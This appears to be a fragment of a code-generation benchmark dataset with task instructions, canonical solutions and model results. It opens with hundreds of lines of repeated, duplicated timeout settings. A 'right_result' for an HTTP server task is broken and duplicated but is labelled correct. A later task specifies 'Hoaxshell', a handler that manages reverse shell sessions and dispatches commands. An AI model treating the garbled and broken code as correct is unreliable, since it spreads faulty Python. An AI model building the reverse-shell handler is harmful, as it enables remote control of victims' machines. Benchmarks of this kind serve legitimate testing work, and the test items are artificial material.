= 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] ="
  },
  {
    "Task_id": 222,
    "Instruction": "Task Description: Create a Python class that implements a simple HTTP server using the http.server module, capable of handling GET requests with customizable response status codes and running in a separate thread.\n\nClass Description: The HttpServer class provides a lightweight HTTP server implementation that can be started and stopped programmatically. It handles GET requests, supports custom response status codes via URL paths, and runs in a daemon thread for non-blocking operation.\n\nAttributes:\n\nDEFAULT_RESPONSE: bytes - Default response body sent for successful requests (default: b\"Hello!\")\nserver: HTTPServer - Instance of the HTTP server\nserver_thread: Thread - Thread running the server's serve_forever loop\n\nMethods:\n\n__init__: () -> None - Initializes the HttpServer instance with server and server_thread set to None\ncreate_server: () -> HTTPServer - Creates and returns an HTTPServer instance bound to localhost on an available port\nrun_server: () -> Tuple[Thread, HTTPServer] - Starts the server in a daemon thread and returns both the thread and server objects\nstart: () -> None - Convenience method to start the server (calls run_server and stores the results)\nshutdown: () -> None - Stops the server and joins the server thread if they exist\n\nNested Class: Handler(BaseHTTPRequestHandler) - Custom request handler for processing HTTP requests\n\nHandler Attributes:\nprotocol_version: str - HTTP protocol version (default: \"HTTP/1.1\")\ntimeout: int - Connection timeout in seconds (default: 3)\nSTATUS_RE: Pattern - Regular expression for matching status code paths\n\nHandler Methods:\ndo_GET: () -> None - Handles GET requests, supports /status/{code} paths to return specific status codes",
    "Canonical_solution": "import re\nfrom http import HTTPStatus\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nfrom threading import Thread\n\nclass HttpServer:\n    DEFAULT_RESPONSE = b\"Hello!\"\n\n    class Handler(BaseHTTPRequestHandler):\n        protocol_version = \"HTTP/1.1\"\n        timeout = 3\n\n        STATUS_RE = re.compile(r\"/status/(\\d+)\")\n\n        def do_GET(self):\n            status_match = self.STATUS_RE.fullmatch(self.path)\n            status = 200\n            if status_match:\n                status = int(status_match.group(1))\n            if status == 200:\n                body = HttpServer.DEFAULT_RESPONSE\n                self.send_response(HTTPStatus.OK)\n                self.send_header(\"Content-Length\", str(len(body)))\n                self.end_headers()\n                self.wfile.write(body)\n            else:\n                self.send_error(status)\n\n    def __init__(self):\n        self.server = None\n        self.server_thread = None\n\n    def create_server(self):\n        server_address = (\"127.0.0.1\", 0)\n        return HTTPServer(server_address, self.Handler)\n\n    def run_server(self):\n        self.server = self.create_server()\n        self.server_thread = Thread(\n            target=self.server.serve_forever, daemon=True, name=\"Test server worker\"\n        )\n        self.server_thread.start()\n        return self.server_thread, self.server\n\n    def start(self):\n        self.server_thread, self.server = self.run_server()\n\n    def shutdown(self):\n        if self.server:\n            self.server.shutdown()\n        if self.server_thread:\n            self.server_thread.join()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "right_result": "class HttpServer:\n    DEFAULT_RESPONSE = b\"Hello!\"\n    \n    def __init__(self):\n        self.server = None\n        self.server_thread = None\n        \n    def create_server(self):\n        from http.server import HTTPServer, BaseHTTPRequestHandler\n        from socketserver import ThreadingMixIn\n        import threading\n        \n        class Handler(BaseHTTPRequestHandler):\n            protocol_version = \"HTTP/1.1\"\n            timeout = 3\n            STATUS_RE = r'/status/(\\d+)'\n            \n            def do_GET(self):\n                match = self.path.match(self.STATUS_RE)\n                if match:\n                    status_code = int(match.group(1))\n                    self.send_response(status_code)\n                    self.end_headers()\n                    self.wfile.write(self.DEFAULT_RESPONSE)\n                    return\n                self.send_response(200)\n                self.end_headers()\n                self.wfile.write(self.DEFAULT_RESPONSE)\n                \n        class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):\n            pass\n        \n        server_address = ('localhost', 0)  # 0 means let the system assign a port\n        server = ThreadedHTTPServer(server_address, Handler)\n        return server\n    \n    def run_server(self):\n        self.server = self.create_server()\n        self.server_thread = threading.Thread(target=self.server.serve_forever, daemon=True)\n        self.server_thread.start()\n        return self.server_thread, self.server\n    \n    def start(self):\n        self.server_thread, self.server = self.run_server()\n    \n    def shutdown(self):\n        if self.server:\n            self.server.shutdown()\n            if self.server_thread:\n                self.server_thread.join()\n\n\nclass HttpServer:\n    DEFAULT_RESPONSE = b\"Hello!\"\n    \n    def __init__(self):\n        self.server = None\n        self.server_thread = None\n        \n    def create_server(self):\n        from http.server import HTTPServer, BaseHTTPRequestHandler\n        from socketserver import ThreadingMixIn\n        import threading\n        \n        class Handler(BaseHTTPRequestHandler):\n            protocol_version = \"HTTP/1.1\"\n            timeout = 3\n            STATUS_RE = r'/status/(\\d+)'\n            \n            def do_GET(self):\n                match = self.path.match(self.STATUS_RE)\n                if match:\n                    status_code = int(match.group(1))\n                    self.send_response(status_code)\n                    self.end_headers()\n                    self.wfile.write(self.DEFAULT_RESPONSE)\n                    return\n                self.send_response(200)\n                self.end_headers()\n                self.wfile.write(self.DEFAULT_RESPONSE)\n                \n        class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):\n            pass\n        \n        server_address = ('localhost', 0)  # 0 means let the system assign a port\n        server = ThreadedHTTPServer(server_address, Handler)\n        return server\n    \n    def run_server(self):\n        self.server = self.create_server()\n        self.server_thread = threading.Thread(target=self.server.serve_forever, daemon=True)\n        self.server_thread.start()\n        return self.server_thread, self.server\n    \n    def start(self):\n        self.server_thread, self.server = self.run_server()\n    \n    def shutdown(self):\n        if self.server:\n            self.server.shutdown()\n            if self.server_thread:\n                self.server_thread.join()"
  },
  {
    "Task_id": 225,
    "Instruction": "Task Description: Create a custom HTTP server class that handles GET, POST, and OPTIONS requests for managing shell sessions, including session verification, command execution, and response handling.\n\nClass Description: Hoaxshell is a custom HTTP request handler that extends BaseHTTPRequestHandler to manage reverse shell sessions. It handles session establishment, command execution, and response collection while maintaining session state.\n\nAttributes:\n- server_name: [str] - Name identifier for the server\n- header_id: [str] - Custom header identifier for session tracking\n- server_unique_id: [str] - Unique identifier for the server instance\n- command_pool: [dict] - Pool of commands to be executed per session\n\nMethods:\n- do_GET([self]) -> None - Handles GET requests for session verification and command retrieval\n- do_POST([self]) -> None - Handles POST requests for command output submission\n- do_OPTIONS([self]) -> None - Handles OPTIONS requests for CORS preflight\n- log_message([self, format, *args]) -> None - Overrides default logging to suppress messages\n- initiate_hoax_server() -> None - Static method to start the HTTP server with optional SSL support\n\nThe class interacts with session management components and implements custom request handling for shell session management, including session verification, command distribution, and response collection. It supports both HTTP and HTTPS modes with configurable ports and SSL certificates.",
